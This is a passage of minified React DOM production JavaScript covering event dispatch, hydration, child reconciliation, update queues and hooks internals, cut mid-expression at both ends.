e;if((b||v)&&(v=m.window===m?m:(v=m.ownerDocument)?v.defaultView||v.parentWindow:window,b?(w=t.relatedTarget||t.toElement,b=d,w=w?Bn(w):null,w!==null&&(T=et(w),w!==T||w.tag!==5&&w.tag!==6)&&(w=null)):(b=null,w=d),b!==w)){if(y=il,x="onMouseLeave",f="onMouseEnter",u="mouse",(e==="pointerout"||e==="pointerover")&&(y=ll,x="onPointerLeave",f="onPointerEnter",u="pointer"),T=b==null?v:lt(b),h=w==null?v:lt(w),v=new y(x,u+"leave",b,t,m),v.target=T,v.relatedTarget=h,x=null,Bn(m)===d&&(y=new y(f,u+"enter",w,t,m),y.target=h,y.relatedTarget=T,x=y),T=x,b&&w)n:{for(y=b,f=w,u=0,h=y;h;h=tt(h))u++;for(h=0,x=f;x;x=tt(x))h++;for(;0<u-h;)y=tt(y),u--;for(;0<h-u;)f=tt(f),h--;for(;u--;){if(y===f||f!==null&&y===f.alternate)break n;y=tt(y),f=tt(f)}y=null}else y=null;b!==null&&wl(p,v,b,y,!1),w!==null&&T!==null&&wl(p,T,w,y,!0)}}e:{if(v=d?lt(d):window,b=v.nodeName&&v.nodeName.toLowerCase(),b==="select"||b==="input"&&v.type==="file")var k=Wh;else if(dl(v))if(xu)k=Yh;else{k=Gh;var E=Vh}else(b=v.nodeName)&&b.toLowerCase()==="input"&&(v.type==="checkbox"||v.type==="radio")&&(k=Kh);if(k&&(k=k(e,d))){ku(p,k,t,m);break e}E&&E(e,v,d),e==="focusout"&&(E=v._wrapperState)&&E.controlled&&v.type==="number"&&Hr(v,"number",v.value)}switch(E=d?lt(d):window,e){case"focusin":(dl(E)||E.contentEditable==="true")&&(it=E,ni=d,Zt=null);break;case"focusout":Zt=ni=it=null;break;case"mousedown":ti=!0;break;case"contextmenu":case"mouseup":case"dragend":ti=!1,gl(p,t,m);break;case"selectionchange":if(Jh)break;case"keydown":case"keyup":gl(p,t,m)}var C;if(Qi)e:{switch(e){case"compositionstart":var L="onCompositionStart";break e;case"compositionend":L="onCompositionEnd";break e;case"compositionupdate":L="onCompositionUpdate";break e}L=void 0}else rt?wu(e,t)&&(L="onCompositionEnd"):e==="keydown"&&t.keyCode===229&&(L="onCompositionStart");L&&(yu&&t.locale!=="ko"&&(rt||L!=="onCompositionStart"?L==="onCompositionEnd"&&rt&&(C=vu()):(Sn=m,Ki="value"in Sn?Sn.value:Sn.textContent,rt=!0)),E=ga(d,L),0<E.length&&(L=new ol(L,e,null,t,m),p.push({event:L,listeners:E}),C?L.data=C:(C=bu(t),C!==null&&(L.data=C)))),(C=Fh?Uh(e,t):Bh(e,t))&&(d=ga(d,"onBeforeInput"),0<d.length&&(m=new ol("onBeforeInput","beforeinput",null,t,m),p.push({event:m,listeners:d}),m.data=C))}Pu(p,n)})}function hs(e,n,t){return{instance:e,listener:n,currentTarget:t}}function ga(e,n){for(var t=n+"Capture",s=[];e!==null;){var a=e,r=a.stateNode;a.tag===5&&r!==null&&(a=r,r=is(e,t),r!=null&&s.unshift(hs(e,r,a)),r=is(e,n),r!=null&&s.push(hs(e,r,a))),e=e.return}return s}function tt(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function wl(e,n,t,s,a){for(var r=n._reactName,o=[];t!==null&&t!==s;){var l=t,c=l.alternate,d=l.stateNode;if(c!==null&&c===s)break;l.tag===5&&d!==null&&(l=d,a?(c=is(t,r),c!=null&&o.unshift(hs(t,c,l))):a||(c=is(t,r),c!=null&&o.push(hs(t,c,l)))),t=t.return}o.length!==0&&e.push({event:n,listeners:o})}var tm=/\r\n?/g,sm=/\u0000|\uFFFD/g;function bl(e){return(typeof e=="string"?e:""+e).replace(tm,`
`).replace(sm,"")}function Ds(e,n,t){if(n=bl(n),bl(e)!==n&&t)throw Error(j(425))}function va(){}var si=null,ai=null;function ri(e,n){return e==="textarea"||e==="noscript"||typeof n.children=="string"||typeof n.children=="number"||typeof n.dangerouslySetInnerHTML=="object"&&n.dangerouslySetInnerHTML!==null&&n.dangerouslySetInnerHTML.__html!=null}var ii=typeof setTimeout=="function"?setTimeout:void 0,am=typeof clearTimeout=="function"?clearTimeout:void 0,kl=typeof Promise=="function"?Promise:void 0,rm=typeof queueMicrotask=="function"?queueMicrotask:typeof kl<"u"?function(e){return kl.resolve(null).then(e).catch(im)}:ii;function im(e){setTimeout(function(){throw e})}function vr(e,n){var t=n,s=0;do{var a=t.nextSibling;if(e.removeChild(t),a&&a.nodeType===8)if(t=a.data,t==="/$"){if(s===0){e.removeChild(a),cs(n);return}s--}else t!=="$"&&t!=="$?"&&t!=="$!"||s++;t=a}while(t);cs(n)}function jn(e){for(;e!=null;e=e.nextSibling){var n=e.nodeType;if(n===1||n===3)break;if(n===8){if(n=e.data,n==="$"||n==="$!"||n==="$?")break;if(n==="/$")return null}}return e}function xl(e){e=e.previousSibling;for(var n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="$"||t==="$!"||t==="$?"){if(n===0)return e;n--}else t==="/$"&&n++}e=e.previousSibling}return null}var It=Math.random().toString(36).slice(2),nn="__reactFiber$"+It,ms="__reactProps$"+It,hn="__reactContainer$"+It,oi="__reactEvents$"+It,om="__reactListeners$"+It,lm="__reactHandles$"+It;function Bn(e){var n=e[nn];if(n)return n;for(var t=e.parentNode;t;){if(n=t[hn]||t[nn]){if(t=n.alternate,n.child!==null||t!==null&&t.child!==null)for(e=xl(e);e!==null;){if(t=e[nn])return t;e=xl(e)}return n}e=t,t=e.parentNode}return null}function _s(e){return e=e[nn]||e[hn],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function lt(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(j(33))}function za(e){return e[ms]||null}var li=[],ct=-1;function Dn(e){return{current:e}}function G(e){0>ct||(e.current=li[ct],li[ct]=null,ct--)}function W(e,n){ct++,li[ct]=e.current,e.current=n}var On={},ve=Dn(On),Ce=Dn(!1),Kn=On;function Tt(e,n){var t=e.type.contextTypes;if(!t)return On;var s=e.stateNode;if(s&&s.__reactInternalMemoizedUnmaskedChildContext===n)return s.__reactInternalMemoizedMaskedChildContext;var a={},r;for(r in t)a[r]=n[r];return s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=n,e.__reactInternalMemoizedMaskedChildContext=a),a}function je(e){return e=e.childContextTypes,e!=null}function ya(){G(Ce),G(ve)}function Sl(e,n,t){if(ve.current!==On)throw Error(j(168));W(ve,n),W(Ce,t)}function Mu(e,n,t){var s=e.stateNode;if(n=n.childContextTypes,typeof s.getChildContext!="function")return t;s=s.getChildContext();for(var a in s)if(!(a in n))throw Error(j(108,Vp(e)||"Unknown",a));return Z({},t,s)}function wa(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||On,Kn=ve.current,W(ve,e),W(Ce,Ce.current),!0}function Tl(e,n,t){var s=e.stateNode;if(!s)throw Error(j(169));t?(e=Mu(e,n,Kn),s.__reactInternalMemoizedMergedChildContext=e,G(Ce),G(ve),W(ve,e)):G(Ce),W(Ce,t)}var ln=null,Fa=!1,yr=!1;function Ru(e){ln===null?ln=[e]:ln.push(e)}function cm(e){Fa=!0,Ru(e)}function zn(){if(!yr&&ln!==null){yr=!0;var e=0,n=$;try{var t=ln;for($=1;e<t.length;e++){var s=t[e];do s=s(!0);while(s!==null)}ln=null,Fa=!1}catch(a){throw ln!==null&&(ln=ln.slice(e+1)),iu($i,zn),a}finally{$=n,yr=!1}}return null}var ut=[],dt=0,ba=null,ka=0,De=[],ze=0,Yn=null,cn=1,un="";function Fn(e,n){ut[dt++]=ka,ut[dt++]=ba,ba=e,ka=n}function Ou(e,n,t){De[ze++]=cn,De[ze++]=un,De[ze++]=Yn,Yn=e;var s=cn;e=un;var a=32-Xe(s)-1;s&=~(1<<a),t+=1;var r=32-Xe(n)+a;if(30<r){var o=a-a%5;r=(s&(1<<o)-1).toString(32),s>>=o,a-=o,cn=1<<32-Xe(n)+a|t<<a|s,un=r+e}else cn=1<<r|t<<a|s,un=e}function Zi(e){e.return!==null&&(Fn(e,1),Ou(e,1,0))}function eo(e){for(;e===ba;)ba=ut[--dt],ut[dt]=null,ka=ut[--dt],ut[dt]=null;for(;e===Yn;)Yn=De[--ze],De[ze]=null,un=De[--ze],De[ze]=null,cn=De[--ze],De[ze]=null}var Ie=null,Pe=null,Y=!1,Ke=null;function qu(e,n){var t=Fe(5,null,null,0);t.elementType="DELETED",t.stateNode=n,t.return=e,n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)}function El(e,n){switch(e.tag){case 5:var t=e.type;return n=n.nodeType!==1||t.toLowerCase()!==n.nodeName.toLowerCase()?null:n,n!==null?(e.stateNode=n,Ie=e,Pe=jn(n.firstChild),!0):!1;case 6:return n=e.pendingProps===""||n.nodeType!==3?null:n,n!==null?(e.stateNode=n,Ie=e,Pe=null,!0):!1;case 13:return n=n.nodeType!==8?null:n,n!==null?(t=Yn!==null?{id:cn,overflow:un}:null,e.memoizedState={dehydrated:n,treeContext:t,retryLane:1073741824},t=Fe(18,null,null,0),t.stateNode=n,t.return=e,e.child=t,Ie=e,Pe=null,!0):!1;default:return!1}}function ci(e){return(e.mode&1)!==0&&(e.flags&128)===0}function ui(e){if(Y){var n=Pe;if(n){var t=n;if(!El(e,n)){if(ci(e))throw Error(j(418));n=jn(t.nextSibling);var s=Ie;n&&El(e,n)?qu(s,t):(e.flags=e.flags&-4097|2,Y=!1,Ie=e)}}else{if(ci(e))throw Error(j(418));e.flags=e.flags&-4097|2,Y=!1,Ie=e}}}function _l(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;Ie=e}function zs(e){if(e!==Ie)return!1;if(!Y)return _l(e),Y=!0,!1;var n;if((n=e.tag!==3)&&!(n=e.tag!==5)&&(n=e.type,n=n!=="head"&&n!=="body"&&!ri(e.type,e.memoizedProps)),n&&(n=Pe)){if(ci(e))throw Du(),Error(j(418));for(;n;)qu(e,n),n=jn(n.nextSibling)}if(_l(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(j(317));e:{for(e=e.nextSibling,n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="/$"){if(n===0){Pe=jn(e.nextSibling);break e}n--}else t!=="$"&&t!=="$!"&&t!=="$?"||n++}e=e.nextSibling}Pe=null}}else Pe=Ie?jn(e.stateNode.nextSibling):null;return!0}function Du(){for(var e=Pe;e;)e=jn(e.nextSibling)}function Et(){Pe=Ie=null,Y=!1}function no(e){Ke===null?Ke=[e]:Ke.push(e)}var um=gn.ReactCurrentBatchConfig;function Ft(e,n,t){if(e=t.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(t._owner){if(t=t._owner,t){if(t.tag!==1)throw Error(j(309));var s=t.stateNode}if(!s)throw Error(j(147,e));var a=s,r=""+e;return n!==null&&n.ref!==null&&typeof n.ref=="function"&&n.ref._stringRef===r?n.ref:(n=function(o){var l=a.refs;o===null?delete l[r]:l[r]=o},n._stringRef=r,n)}if(typeof e!="string")throw Error(j(284));if(!t._owner)throw Error(j(290,e))}return e}function Fs(e,n){throw e=Object.prototype.toString.call(n),Error(j(31,e==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":e))}function Nl(e){var n=e._init;return n(e._payload)}function zu(e){function n(f,u){if(e){var h=f.deletions;h===null?(f.deletions=[u],f.flags|=16):h.push(u)}}function t(f,u){if(!e)return null;for(;u!==null;)n(f,u),u=u.sibling;return null}function s(f,u){for(f=new Map;u!==null;)u.key!==null?f.set(u.key,u):f.set(u.index,u),u=u.sibling;return f}function a(f,u){return f=In(f,u),f.index=0,f.sibling=null,f}function r(f,u,h){return f.index=h,e?(h=f.alternate,h!==null?(h=h.index,h<u?(f.flags|=2,u):h):(f.flags|=2,u)):(f.flags|=1048576,u)}function o(f){return e&&f.alternate===null&&(f.flags|=2),f}function l(f,u,h,x){return u===null||u.tag!==6?(u=Er(h,f.mode,x),u.return=f,u):(u=a(u,h),u.return=f,u)}function c(f,u,h,x){var k=h.type;return k===at?m(f,u,h.props.children,x,h.key):u!==null&&(u.elementType===k||typeof k=="object"&&k!==null&&k.$$typeof===wn&&Nl(k)===u.type)?(x=a(u,h.props),x.ref=Ft(f,u,h),x.return=f,x):(x=ia(h.type,h.key,h.props,null,f.mode,x),x.ref=Ft(f,u,h),x.return=f,x)}function d(f,u,h,x){return u===null||u.tag!==4||u.stateNode.containerInfo!==h.containerInfo||u.stateNode.implementation!==h.implementation?(u=_r(h,f.mode,x),u.return=f,u):(u=a(u,h.children||[]),u.return=f,u)}function m(f,u,h,x,k){return u===null||u.tag!==7?(u=Vn(h,f.mode,x,k),u.return=f,u):(u=a(u,h),u.return=f,u)}function p(f,u,h){if(typeof u=="string"&&u!==""||typeof u=="number")return u=Er(""+u,f.mode,h),u.return=f,u;if(typeof u=="object"&&u!==null){switch(u.$$typeof){case js:return h=ia(u.type,u.key,u.props,null,f.mode,h),h.ref=Ft(f,null,u),h.return=f,h;case st:return u=_r(u,f.mode,h),u.return=f,u;case wn:var x=u._init;return p(f,x(u._payload),h)}if(Vt(u)||Rt(u))return u=Vn(u,f.mode,h,null),u.return=f,u;Fs(f,u)}return null}function v(f,u,h,x){var k=u!==null?u.key:null;if(typeof h=="string"&&h!==""||typeof h=="number")return k!==null?null:l(f,u,""+h,x);if(typeof h=="object"&&h!==null){switch(h.$$typeof){case js:return h.key===k?c(f,u,h,x):null;case st:return h.key===k?d(f,u,h,x):null;case wn:return k=h._init,v(f,u,k(h._payload),x)}if(Vt(h)||Rt(h))return k!==null?null:m(f,u,h,x,null);Fs(f,h)}return null}function b(f,u,h,x,k){if(typeof x=="string"&&x!==""||typeof x=="number")return f=f.get(h)||null,l(u,f,""+x,k);if(typeof x=="object"&&x!==null){switch(x.$$typeof){case js:return f=f.get(x.key===null?h:x.key)||null,c(u,f,x,k);case st:return f=f.get(x.key===null?h:x.key)||null,d(u,f,x,k);case wn:var E=x._init;return b(f,u,h,E(x._payload),k)}if(Vt(x)||Rt(x))return f=f.get(h)||null,m(u,f,x,k,null);Fs(u,x)}return null}function w(f,u,h,x){for(var k=null,E=null,C=u,L=u=0,O=null;C!==null&&L<h.length;L++){C.index>L?(O=C,C=null):O=C.sibling;var R=v(f,C,h[L],x);if(R===null){C===null&&(C=O);break}e&&C&&R.alternate===null&&n(f,C),u=r(R,u,L),E===null?k=R:E.sibling=R,E=R,C=O}if(L===h.length)return t(f,C),Y&&Fn(f,L),k;if(C===null){for(;L<h.length;L++)C=p(f,h[L],x),C!==null&&(u=r(C,u,L),E===null?k=C:E.sibling=C,E=C);return Y&&Fn(f,L),k}for(C=s(f,C);L<h.length;L++)O=b(C,f,L,h[L],x),O!==null&&(e&&O.alternate!==null&&C.delete(O.key===null?L:O.key),u=r(O,u,L),E===null?k=O:E.sibling=O,E=O);return e&&C.forEach(function(B){return n(f,B)}),Y&&Fn(f,L),k}function y(f,u,h,x){var k=Rt(h);if(typeof k!="function")throw Error(j(150));if(h=k.call(h),h==null)throw Error(j(151));for(var E=k=null,C=u,L=u=0,O=null,R=h.next();C!==null&&!R.done;L++,R=h.next()){C.index>L?(O=C,C=null):O=C.sibling;var B=v(f,C,R.value,x);if(B===null){C===null&&(C=O);break}e&&C&&B.alternate===null&&n(f,C),u=r(B,u,L),E===null?k=B:E.sibling=B,E=B,C=O}if(R.done)return t(f,C),Y&&Fn(f,L),k;if(C===null){for(;!R.done;L++,R=h.next())R=p(f,R.value,x),R!==null&&(u=r(R,u,L),E===null?k=R:E.sibling=R,E=R);return Y&&Fn(f,L),k}for(C=s(f,C);!R.done;L++,R=h.next())R=b(C,f,L,R.value,x),R!==null&&(e&&R.alternate!==null&&C.delete(R.key===null?L:R.key),u=r(R,u,L),E===null?k=R:E.sibling=R,E=R);return e&&C.forEach(function(K){return n(f,K)}),Y&&Fn(f,L),k}function T(f,u,h,x){if(typeof h=="object"&&h!==null&&h.type===at&&h.key===null&&(h=h.props.children),typeof h=="object"&&h!==null){switch(h.$$typeof){case js:e:{for(var k=h.key,E=u;E!==null;){if(E.key===k){if(k=h.type,k===at){if(E.tag===7){t(f,E.sibling),u=a(E,h.props.children),u.return=f,f=u;break e}}else if(E.elementType===k||typeof k=="object"&&k!==null&&k.$$typeof===wn&&Nl(k)===E.type){t(f,E.sibling),u=a(E,h.props),u.ref=Ft(f,E,h),u.return=f,f=u;break e}t(f,E);break}else n(f,E);E=E.sibling}h.type===at?(u=Vn(h.props.children,f.mode,x,h.key),u.return=f,f=u):(x=ia(h.type,h.key,h.props,null,f.mode,x),x.ref=Ft(f,u,h),x.return=f,f=x)}return o(f);case st:e:{for(E=h.key;u!==null;){if(u.key===E)if(u.tag===4&&u.stateNode.containerInfo===h.containerInfo&&u.stateNode.implementation===h.implementation){t(f,u.sibling),u=a(u,h.children||[]),u.return=f,f=u;break e}else{t(f,u);break}else n(f,u);u=u.sibling}u=_r(h,f.mode,x),u.return=f,f=u}return o(f);case wn:return E=h._init,T(f,u,E(h._payload),x)}if(Vt(h))return w(f,u,h,x);if(Rt(h))return y(f,u,h,x);Fs(f,h)}return typeof h=="string"&&h!==""||typeof h=="number"?(h=""+h,u!==null&&u.tag===6?(t(f,u.sibling),u=a(u,h),u.return=f,f=u):(t(f,u),u=Er(h,f.mode,x),u.return=f,f=u),o(f)):t(f,u)}return T}var _t=zu(!0),Fu=zu(!1),xa=Dn(null),Sa=null,pt=null,to=null;function so(){to=pt=Sa=null}function ao(e){var n=xa.current;G(xa),e._currentValue=n}function di(e,n,t){for(;e!==null;){var s=e.alternate;if((e.childLanes&n)!==n?(e.childLanes|=n,s!==null&&(s.childLanes|=n)):s!==null&&(s.childLanes&n)!==n&&(s.childLanes|=n),e===t)break;e=e.return}}function bt(e,n){Sa=e,to=pt=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&n&&(Ne=!0),e.firstContext=null)}function Be(e){var n=e._currentValue;if(to!==e)if(e={context:e,memoizedValue:n,next:null},pt===null){if(Sa===null)throw Error(j(308));pt=e,Sa.dependencies={lanes:0,firstContext:e}}else pt=pt.next=e;return n}var Hn=null;function ro(e){Hn===null?Hn=[e]:Hn.push(e)}function Uu(e,n,t,s){var a=n.interleaved;return a===null?(t.next=t,ro(n)):(t.next=a.next,a.next=t),n.interleaved=t,mn(e,s)}function mn(e,n){e.lanes|=n;var t=e.alternate;for(t!==null&&(t.lanes|=n),t=e,e=e.return;e!==null;)e.childLanes|=n,t=e.alternate,t!==null&&(t.childLanes|=n),t=e,e=e.return;return t.tag===3?t.stateNode:null}var bn=!1;function io(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function Bu(e,n){e=e.updateQueue,n.updateQueue===e&&(n.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function dn(e,n){return{eventTime:e,lane:n,tag:0,payload:null,callback:null,next:null}}function Ln(e,n,t){var s=e.updateQueue;if(s===null)return null;if(s=s.shared,F&2){var a=s.pending;return a===null?n.next=n:(n.next=a.next,a.next=n),s.pending=n,mn(e,t)}return a=s.interleaved,a===null?(n.next=n,ro(s)):(n.next=a.next,a.next=n),s.interleaved=n,mn(e,t)}function ea(e,n,t){if(n=n.updateQueue,n!==null&&(n=n.shared,(t&4194240)!==0)){var s=n.lanes;s&=e.pendingLanes,t|=s,n.lanes=t,Wi(e,t)}}function Cl(e,n){var t=e.updateQueue,s=e.alternate;if(s!==null&&(s=s.updateQueue,t===s)){var a=null,r=null;if(t=t.firstBaseUpdate,t!==null){do{var o={eventTime:t.eventTime,lane:t.lane,tag:t.tag,payload:t.payload,callback:t.callback,next:null};r===null?a=r=o:r=r.next=o,t=t.next}while(t!==null);r===null?a=r=n:r=r.next=n}else a=r=n;t={baseState:s.baseState,firstBaseUpdate:a,lastBaseUpdate:r,shared:s.shared,effects:s.effects},e.updateQueue=t;return}e=t.lastBaseUpdate,e===null?t.firstBaseUpdate=n:e.next=n,t.lastBaseUpdate=n}function Ta(e,n,t,s){var a=e.updateQueue;bn=!1;var r=a.firstBaseUpdate,o=a.lastBaseUpdate,l=a.shared.pending;if(l!==null){a.shared.pending=null;var c=l,d=c.next;c.next=null,o===null?r=d:o.next=d,o=c;var m=e.alternate;m!==null&&(m=m.updateQueue,l=m.lastBaseUpdate,l!==o&&(l===null?m.firstBaseUpdate=d:l.next=d,m.lastBaseUpdate=c))}if(r!==null){var p=a.baseState;o=0,m=d=c=null,l=r;do{var v=l.lane,b=l.eventTime;if((s&v)===v){m!==null&&(m=m.next={eventTime:b,lane:0,tag:l.tag,payload:l.payload,callback:l.callback,next:null});e:{var w=e,y=l;switch(v=n,b=t,y.tag){case 1:if(w=y.payload,typeof w=="function"){p=w.call(b,p,v);break e}p=w;break e;case 3:w.flags=w.flags&-65537|128;case 0:if(w=y.payload,v=typeof w=="function"?w.call(b,p,v):w,v==null)break e;p=Z({},p,v);break e;case 2:bn=!0}}l.callback!==null&&l.lane!==0&&(e.flags|=64,v=a.effects,v===null?a.effects=[l]:v.push(l))}else b={eventTime:b,lane:v,tag:l.tag,payload:l.payload,callback:l.callback,next:null},m===null?(d=m=b,c=p):m=m.next=b,o|=v;if(l=l.next,l===null){if(l=a.shared.pending,l===null)break;v=l,l=v.next,v.next=null,a.lastBaseUpdate=v,a.shared.pending=null}}while(!0);if(m===null&&(c=p),a.baseState=c,a.firstBaseUpdate=d,a.lastBaseUpdate=m,n=a.shared.interleaved,n!==null){a=n;do o|=a.lane,a=a.next;while(a!==n)}else r===null&&(a.shared.lanes=0);Qn|=o,e.lanes=o,e.memoizedState=p}}function jl(e,n,t){if(e=n.effects,n.effects=null,e!==null)for(n=0;n<e.length;n++){var s=e[n],a=s.callback;if(a!==null){if(s.callback=null,s=t,typeof a!="function")throw Error(j(191,a));a.call(s)}}}var Ns={},sn=Dn(Ns),fs=Dn(Ns),gs=Dn(Ns);function $n(e){if(e===Ns)throw Error(j(174));return e}function oo(e,n){switch(W(gs,n),W(fs,e),W(sn,Ns),e=n.nodeType,e){case 9:case 11:n=(n=n.documentElement)?n.namespaceURI:Wr(null,"");break;default:e=e===8?n.parentNode:n,n=e.namespaceURI||null,e=e.tagName,n=Wr(n,e)}G(sn),W(sn,n)}function Nt(){G(sn),G(fs),G(gs)}function Hu(e){$n(gs.current);var n=$n(sn.current),t=Wr(n,e.type);n!==t&&(W(fs,e),W(sn,t))}function lo(e){fs.current===e&&(G(sn),G(fs))}var Q=Dn(0);function Ea(e){for(var n=e;n!==null;){if(n.tag===13){var t=n.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||t.data==="$?"||t.data==="$!"))return n}else if(n.tag===19&&n.memoizedProps.revealOrder!==void 0){if(n.flags&128)return n}else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return null;n=n.return}n.sibling.return=n.return,n=n.sibling}return null}var wr=[];function co(){for(var e=0;e<wr.length;e++)wr[e]._workInProgressVersionPrimary=null;wr.length=0}var na=gn.ReactCurrentDispatcher,br=gn.ReactCurrentBatchConfig,Xn=0,J=null,ae=null,oe=null,_a=!1,es=!1,vs=0,dm=0;function me(){throw Error(j(321))}function uo(e,n){if(n===null)return!1;for(var t=0;t<n.length&&t<e.length;t++)if(!Je(e[t],n[t]))return!1;return!0}function po(e,n,t,s,a,r){if(Xn=r,J=n,n.memoizedState=null,n.updateQueue=null,n.lanes=0,na.current=e===null||e.memoizedState===null?fm:gm,e=t(s,a),es){r=0;do{if(es=!1,vs=0,25<=r)throw Error(j(301));r+=1,oe=ae=null,n.updateQueue=null,na.current=vm,e=t(s,a)}while(es)}if(na.current=Na,n=ae!==null&&ae.next!==null,Xn=0,oe=ae=J=null,_a=!1,n)throw Error(j(300));return e}function ho(){var e=vs!==0;return vs=0,e}function en(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return oe===null?J.memoizedState=oe=e:oe=oe.next=e,oe}function He(){if(ae===null){var e=J.alternate;e=e!==null?e.memoizedState:null}else e=ae.next;var n=oe===null?J.memoizedState:oe.next;if(n!==null)oe=n,ae=e;else{if(e===null)throw Error(j(310));ae=e,e={memoizedState:ae.memoizedState,baseState:ae.baseState,baseQueue:ae.baseQueue,queue:ae.queue,next:null},oe===null?J.memoizedState=oe=e:oe=oe.next=e}return oe}function ys(e,n){return typeof n=="function"?n(e):n}function kr(e){var n=He(),t=n.queue;if(t===null)throw Error(j(311));t.lastRenderedReducer=e;var s=ae,a=s.baseQueue,r=t.pending;if(r!==null){if(a!==null){var o=a.next;a.next=r.next,r.next=o}s.baseQueue=a=r,t.pending=null}if(a!==null){r=a.next,s=s.baseState;var l=o=null,c=null,d=r;do{var m=d.lane;if((Xn&m)===m)c!==null&&(c=c.next={lane:0,action:d.action,hasEagerState:d.hasEagerState,eagerState:d.eagerState,next:null}),s=d.hasEagerState?d.eagerState:e(s,d.action);else{var p={lane:m,action:d.action,hasEagerState:d.hasEagerState,eagerState:d.eagerState,next:null};c===null?(l=c=p,o=s):c=c.next=p,J.lanes|=m,Qn|=m}d=d.next}while(d!==null&&d!==r);c===null?o=s:c.next=l,Je(s,n.memoizedState)||(Ne=!0),n.memoizedState=s,n.baseState=o,n.baseQueue=c,t.lastRenderedState=s}if(e=t.interleaved,e!==null){a=e;do r=a.lane,J.lanes|=r,Qn|=r,a=a.next;while(a!==e)}else a===null&&(t.lanes=0);return[n.memoizedState,t.dispatch]}function xr(e){var n=He(),t=n.queue;if(t===null)throw Error(j(311));t.lastRenderedReducer=e;var s=t.dispatch,a=t.pending,r=n.memoizedState;if(a!==null){t.pending=null;var o=a=a.next;do r=e(r,o.action),o=o.next;while(o!==a);Je(r,n.memoizedState)||(Ne=!0),n.memoizedState=r,n.baseQueue===null&&(n.baseState=r),t.lastRenderedState=r}return[r,s]}function $u(){}function Wu(e,n){var t=J,s=He(),a=n(),r=!Je(s.memoizedState,a);if(r&&(s.memoizedState=a,Ne=!0),s=s.queue,mo(Ku.bind(null,t,s,e),[e]),s.getSnapshot!==n||r||oe!==null&&oe.memoizedState.tag&1){if(t.flags|=2048,ws(9,Gu.bind(null,t,s,a,n),void 0,null),ce===null)throw Error(j(349));Xn&30||Vu(t,n,a)}return a}function Vu(e,n,t){e.flags|=16384,e={getSnapshot:n,value:t},n=J.updateQueue,n===null?(n={lastEffect:null,stores:null},J.updateQueue=n,n.stores=[e]):(t=n.stores,t===null?n.stores=[e]:t.push(e))}function Gu(e,n,t,s){n.value=t,n.getSnapshot=s,Yu(n)&&Xu(e)}function Ku(e,n,t){return t(function(){Yu(n)&&Xu(e)})}function Yu(e){var n=e.getSnapshot;e=e.value;try{var t=n();return!Je(e,t)}catch{return!0}}function Xu(e){var n=mn(e,1);n!==null&&Qe(n,e,1,-1)}function Ll(e){var n=en();return typeof e=="function"&&(e=e()),n.memoizedState=n.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:ys,lastRenderedState:e},n.queue=e,e=e.dispatch=mm.bind(null,J,e),[n.memoizedState,e]}function ws(e,n,t,s){return e={tag:e,create:n,destroy:t,deps:s,next:null},n=J.updateQueue,n===null?(n={lastEffect:null,stores:null},J.updateQueue=n,n.lastEffect=e.next=e):(t=n.lastEffect,t===null?n.lastEffect=e.next=e:(s=t.next,t.next=e,e.next=s,n.lastEffect=e)),e}function Qu(){return He().memoizedState}function ta(e,n,t,s){var a=en();J.flags|=e,a.memoizedState=ws(1|n,t,void 0,s===void 0?null:s)}function Ua(e,n,t,s){var a=He();s=s===void 0?null:s;var r=void 0;if(ae!==null){var o=ae.memoizedState;if(r=o.destroy,s!==null&&uo(s,o.deps)){a.memoizedState=ws(n,t,r,s);return}}J.flags|=e,a.memoizedState=ws(1|n,t,r,s)}function Al(e,n){return ta(8390656,8,e,n)}function mo(e,n){return Ua(2048,8,e,n)}function Ju(e,n){return Ua(4,2,e,n)}function Zu(e,n){return Ua(4,4,e,n)}function ed(e,n){if(typeof n=="function")return e=e(),n(e),function(){n(null)};if(n!=null)return e=e(),n.current=e,function(){n.current=null}}function nd(e,n,t){return t=t!=null?t.concat([e]):null,Ua(4,4,ed.bind(null,n,e),t)}function fo(){}function td(e,n){var t=He();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&uo(n,s[1])?s[0]:(t.memoizedState=[e,n],e)}function sd(e,n){var t=He();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&uo(n,s[1])?s[0]:(e=e(),t.memoizedState=[e,n],e)}function ad(e,n,t){return Xn&21?(Je(t,n)||(t=cu(),J.lanes|=t,Qn|=t,e.baseState=!0),n):(e.baseState&&(e.baseState=!1,Ne=!0),e.memoizedState=t)}function pm(e,n){var t=$;$=t!==0&&4>t?t:4,e(!0);var s=br.transition;br.transition={};try{e(!1),n()}finally{$=t,br.transition=s}}function rd(){return He().memoizedState}function hm(e,n,t){var s=Pn(e);if(t={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null},id(e))od(n,t);else if(t=Uu(e,n,t,s),t!==null){var a=xe();Qe(t,e,s,a),ld(t,n,s)}}function mm(e,n,t){var s=Pn(e),a={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null};if(id(e))od(n,a);else{var r=e.alternate;if(e.lanes===0&&(r===null||r.lanes===0)&&(r=n.lastRenderedReducer,r!==null))try{var o=n.lastRenderedState,l=r(o,t);if(a.hasEagerState=!0,a.eagerState=l,Je(l,o)){var 